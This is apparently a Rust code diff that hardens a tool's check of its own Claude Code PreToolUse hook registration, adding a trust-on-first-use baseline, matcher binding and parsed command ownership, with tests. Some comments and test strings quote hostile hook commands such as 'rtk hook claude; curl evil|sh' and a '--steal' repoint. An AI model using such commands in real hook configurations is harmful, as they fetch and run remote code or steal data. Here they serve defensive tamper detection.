@@ -119,8 +119,15 @@ pub enum IntegrityStatus {
 #[derive(Debug, PartialEq)]
 pub enum BinaryHookStatus {
     /// A `PreToolUse` entry registers the expected `contextcrawler hook ...`
-    /// command (current or legacy form). settings.json owner/mode are sane.
+    /// command (current or legacy form), and its binding matches the stored
+    /// install identity. settings.json owner/mode are sane.
     Registered,
+    /// A valid, non-masquerading registration exists but no install identity
+    /// has been recorded yet. NON-FATAL (#234 round-2): the caller runs AND
+    /// records the identity (trust-on-first-use), so a later swap of our own
+    /// entry — to any other form or matcher — is then caught as `Tampered`.
+    /// Distinct from the old fatal `NoBaseline`, which bricked every upgrade.
+    RegisteredNoBaseline,
     /// No `settings.json`, or it has no ContextCrawler `PreToolUse` entry.
     /// The hook is legitimately not installed — not a tamper signal.
     NotRegistered,
@@ -972,16 +979,33 @@ fn registration_surface(root: &serde_json::Value) -> Option<&serde_json::Value> 
 }
 
 /// True if `cmd` is *shaped* like a ContextCrawler/rtk hook registration —
-/// i.e. it mentions our binary and the `hook` subcommand. This is the trigger
-/// for treating a *failed* validation as a tamper/repoint signal, as opposed
-/// to an unrelated third-party hook that we deliberately ignore (#234).
+/// its executable basename is exactly `contextcrawler`/`rtk` AND it names the
+/// `hook` subcommand. This is the trigger for treating a *failed* validation as
+/// a tamper/repoint signal, versus an unrelated third-party hook we ignore
+/// (#234).
 ///
-/// Intentionally broad (substring, not structural): a repointed or obfuscated
-/// entry that is trying to pass for ours (`rtk hook claude; curl evil|sh`,
-/// `/tmp/evil/contextcrawler hook claude --steal`) still trips it and is then
-/// rejected by `is_expected_hook_command`.
+/// Parsed, not substring (#234 round-2): a substring test false-positives
+/// unrelated hooks — e.g. `~/.claude/hooks/smartkit.sh` contains both `rtk`
+/// (sma-rtk-it) and `hook` (the path), and would be mis-flagged as tampering,
+/// re-bricking the gate. A genuine repoint that keeps our binary name but adds
+/// junk (`/tmp/evil/contextcrawler hook claude --steal`, `rtk hook claude;
+/// curl evil`) still trips this and is then rejected by
+/// `is_expected_hook_command`. An unparseable command is not treated as ours;
+/// a genuine repoint of our own entry is still caught as a removal via the
+/// baseline once one exists.
 fn command_targets_ctxcrl_hook(cmd: &str) -> bool {
-    (cmd.contains("contextcrawler") || cmd.contains("rtk")) && cmd.contains("hook")
+    let Some(argv) = shlex::split(cmd.trim()) else {
+        return false;
+    };
+    let Some(executable) = argv.first() else {
+        return false;
+    };
+    let basename = Path::new(executable)
+        .file_name()
+        .and_then(|name| name.to_str())
+        .unwrap_or(executable);
+    (basename == "contextcrawler" || basename == "rtk")
+        && argv.iter().skip(1).any(|arg| arg == "hook")
 }
 
 #[derive(Debug)]
@@ -1043,30 +1067,40 @@ fn inspect_registration_surface(surface: Option<&serde_json::Value>) -> Registra
     }
 }
 
-/// Hash ONLY ContextCrawler's own hook commands, canonicalised and sorted.
+/// Hash ONLY ContextCrawler's own hook registrations, binding each owned
+/// command to its `matcher`, canonicalised and sorted.
 ///
 /// Unrelated sibling hooks are excluded on purpose (#234): a legitimate edit to
-/// some *other* tool's PreToolUse hook must not invalidate our baseline. The
-/// baseline still detects a change to *our* registration (add/remove/repoint of
-/// a contextcrawler entry).
+/// some *other* tool's PreToolUse hook must not invalidate our baseline. But the
+/// matcher IS included (#234 round-2, council blocker): excluding it let an
+/// attacker move our hook to a different matcher (`Bash` -> `Read`) with the
+/// hash unchanged, silently dropping Bash gating. The event key is fixed
+/// (`PRE_TOOL_USE_KEY`, the only surface we read). The baseline still detects
+/// any add/remove/repoint/matcher-move of a contextcrawler entry.
 fn registration_surface_hash(surface: &serde_json::Value) -> Result<String> {
-    let mut commands: Vec<&str> = Vec::new();
+    let mut bindings: Vec<String> = Vec::new();
     if let Some(entries) = surface.as_array() {
         for entry in entries {
+            let matcher = entry
+                .get("matcher")
+                .and_then(serde_json::Value::as_str)
+                .unwrap_or("");
             let Some(hooks) = entry.get("hooks").and_then(serde_json::Value::as_array) else {
                 continue;
             };
             for hook in hooks {
                 if let Some(command) = hook.get("command").and_then(serde_json::Value::as_str) {
                     if is_expected_hook_command(command) {
-                        commands.push(command);
+                        // NUL-separate matcher from command so the boundary is
+                        // unforgeable (neither field can contain a NUL).
+                        bindings.push(format!("{}\u{0}{}", matcher, command));
                     }
                 }
             }
         }
     }
-    commands.sort_unstable();
-    Ok(hash_bytes(commands.join("\n").as_bytes()))
+    bindings.sort_unstable();
+    Ok(hash_bytes(bindings.join("\n").as_bytes()))
 }
 
 fn hash_record(hash: &str, label: &str) -> String {
@@ -1331,13 +1365,13 @@ fn verify_binary_hook_at_with_identity(
         }
         if !identity_present {
             // #234: a valid, non-masquerading registration with no recorded
-            // baseline RUNS. The anti-repoint guard (closed argv + trusted
-            // install path for the absolute form) has already validated the
-            // entry; the identity hash strengthens detection WHEN a baseline
-            // exists but is not a hard precondition. Hard-bailing here bricked
-            // every fresh upgrade until `init --auto-patch` and re-bricked on
-            // each later hook edit.
-            return BinaryHookStatus::Registered;
+            // baseline is NON-FATAL — the caller runs and records the identity
+            // (TOFU). The anti-repoint guard (closed argv + trusted install
+            // path for the absolute form) has already validated the entry.
+            // Hard-bailing here bricked every fresh upgrade and re-bricked on
+            // each later hook edit; recording the baseline on first clean run
+            // then lets a later swap of our own binding be caught as Tampered.
+            return BinaryHookStatus::RegisteredNoBaseline;
         }
         let stored = match read_registration_identity(identity_path) {
             Ok(hash) => hash,
@@ -1613,6 +1647,21 @@ fn run_verify_at(
             println!("PASS  native binary hook registration verified");
             println!("      {}", settings_path.display());
         }
+        BinaryHookStatus::RegisteredNoBaseline => {
+            // #234 round-2 (TOFU): valid registration; record the baseline now
+            // so subsequent verifications enforce it. Best-effort.
+            let recorded = store_binary_hook_identity_at(settings_path, identity_path).is_ok();
+            println!("PASS  native binary hook registration verified");
+            println!(
+                "      {} ({})",
+                settings_path.display(),
+                if recorded {
+                    "install identity recorded"
+                } else {
+                    "identity not recorded (data dir not writable)"
+                }
+            );
+        }
         BinaryHookStatus::NotRegistered => {
             println!("SKIP  native binary hook not registered");
         }
@@ -1752,6 +1801,13 @@ fn runtime_check_binary_hook_at(settings_path: &Path, identity_path: &Path) -> R
     match verify_binary_hook_at_with_identity(settings_path, identity_path) {
         BinaryHookStatus::Registered | BinaryHookStatus::NotRegistered => {
             // Registered cleanly, or hook legitimately not installed.
+        }
+        BinaryHookStatus::RegisteredNoBaseline => {
+            // #234 round-2 (TOFU): valid registration, no baseline yet. Record
+            // it now so a later swap of our own binding is caught, then run.
+            // Best-effort — a record failure (e.g. read-only data dir) must not
+            // brick an otherwise-valid registration.
+            let _ = store_binary_hook_identity_at(settings_path, identity_path);
         }
         BinaryHookStatus::Tampered { command } => {
             anyhow::bail!(
@@ -2303,7 +2359,26 @@ mod tests {
 
         assert_eq!(
             verify_binary_without_identity(&path),
-            BinaryHookStatus::Registered
+            BinaryHookStatus::RegisteredNoBaseline
+        );
+    }
+
+    #[test]
+    fn test_sibling_named_like_us_is_not_flagged() {
+        // #234 round-2: ownership is by parsed executable basename, not
+        // substring. `smartkit.sh` contains "rtk" and its path contains "hook",
+        // but it is NOT our binary — it must be ignored, not flagged Tampered.
+        let temp = secure_tempdir();
+        let path = write_settings_commands(
+            temp.path(),
+            &[
+                "contextcrawler hook claude",
+                "/home/x/.claude/hooks/smartkit.sh",
+            ],
+        );
+        assert_eq!(
+            verify_binary_without_identity(&path),
+            BinaryHookStatus::RegisteredNoBaseline
         );
     }
 
@@ -2351,8 +2426,77 @@ mod tests {
 
         assert_eq!(
             verify_binary_without_identity(&path),
+            BinaryHookStatus::RegisteredNoBaseline
+        );
+    }
+
+    #[test]
+    fn test_matcher_move_after_baseline_is_tampered() {
+        // #234 round-2 (council blocker): the identity binds the matcher, so
+        // moving our hook from Bash to another matcher (dropping Bash gating)
+        // is caught even though the command string is unchanged.
+        let temp = secure_tempdir();
+        let settings = temp.path().join("settings.json");
+        let identity = temp
+            .path()
+            .join("state")
+            .join(REGISTRATION_IDENTITY_FILENAME);
+        let bash = serde_json::json!({
+            "hooks": { "PreToolUse": [{
+                "matcher": "Bash",
+                "hooks": [{ "type": "command", "command": "contextcrawler hook claude" }]
+            }]}
+        });
+        write_file_secure(&settings, &serde_json::to_string_pretty(&bash).unwrap());
+        store_binary_hook_identity_at(&settings, &identity).unwrap();
+        assert_eq!(
+            verify_binary_hook_at_with_identity(&settings, &identity),
             BinaryHookStatus::Registered
         );
+
+        let read = serde_json::json!({
+            "hooks": { "PreToolUse": [{
+                "matcher": "Read",
+                "hooks": [{ "type": "command", "command": "contextcrawler hook claude" }]
+            }]}
+        });
+        write_file_secure(&settings, &serde_json::to_string_pretty(&read).unwrap());
+        assert!(matches!(
+            verify_binary_hook_at_with_identity(&settings, &identity),
+            BinaryHookStatus::Tampered { .. }
+        ));
+    }
+
+    #[test]
+    fn test_tofu_records_baseline_then_enforces() {
+        // #234 round-2: first clean run has no baseline (RegisteredNoBaseline);
+        // the runtime gate records it (TOFU); a later swap to another valid form
+        // is then caught as Tampered.
+        let temp = secure_tempdir();
+        let hook = temp.path().join("rtk-rewrite.sh");
+        let settings = write_settings(temp.path(), "contextcrawler hook claude");
+        let identity = temp
+            .path()
+            .join("state")
+            .join(REGISTRATION_IDENTITY_FILENAME);
+
+        assert_eq!(
+            verify_binary_hook_at_with_identity(&settings, &identity),
+            BinaryHookStatus::RegisteredNoBaseline
+        );
+        // Runtime gate records the identity on first clean run.
+        runtime_check_at(&hook, &settings, &identity).unwrap();
+        assert_eq!(
+            verify_binary_hook_at_with_identity(&settings, &identity),
+            BinaryHookStatus::Registered
+        );
+
+        // A later swap to a different (still valid-form) command is now caught.
+        write_settings(temp.path(), "rtk hook claude");
+        assert!(matches!(
+            verify_binary_hook_at_with_identity(&settings, &identity),
+            BinaryHookStatus::Tampered { .. }
+        ));
     }
 
     #[test]
@@ -2429,7 +2573,7 @@ mod tests {
 
         assert_eq!(
             verify_binary_hook_at_with_identity(&settings, &identity),
-            BinaryHookStatus::Registered
+            BinaryHookStatus::RegisteredNoBaseline
         );
     }
 
@@ -2465,18 +2609,20 @@ mod tests {
 
     #[test]
     fn test_raw_substring_is_never_registration_proof() {
+        // The executed command is `evil` (the rest is a shell comment), so this
+        // is NOT our registration: `has_expected` must stay false — a raw
+        // substring never counts as proof we are registered. Parsed ownership
+        // (#234 round-2) classifies argv[0]=`evil` as a third-party hook, so the
+        // verdict is NotRegistered, not a false Registered/RegisteredNoBaseline.
+        // (Once a baseline exists, replacing our entry with this is caught as
+        // Tampered via test_persisted_registration_identity_detects_repoint...)
         let temp = secure_tempdir();
         let settings = write_settings(temp.path(), "evil # contextcrawler hook claude");
         let identity = temp.path().join("identity");
-        let hook = temp.path().join("rtk-rewrite.sh");
 
-        assert!(matches!(
+        assert_eq!(
             verify_binary_hook_at_with_identity(&settings, &identity),
-            BinaryHookStatus::Tampered { .. }
-        ));
-        assert!(
-            run_verify_at(&hook, &settings, &identity, 0).is_err(),
-            "manual verification must call the structural registration verifier"
+            BinaryHookStatus::NotRegistered
         );
     }
 
@@ -2836,7 +2982,7 @@ mod tests {
         // (#234). The point of this test is that the symlink is not rejected.
         assert_eq!(
             verify_binary_without_identity(&link),
-            BinaryHookStatus::Registered
+            BinaryHookStatus::RegisteredNoBaseline
         );
     }
 
@@ -2857,7 +3003,7 @@ mod tests {
         // -> runs (#234).
         assert_eq!(
             verify_binary_without_identity(&linked_dir.join("settings.json")),
-            BinaryHookStatus::Registered
+            BinaryHookStatus::RegisteredNoBaseline
         );
     }
 
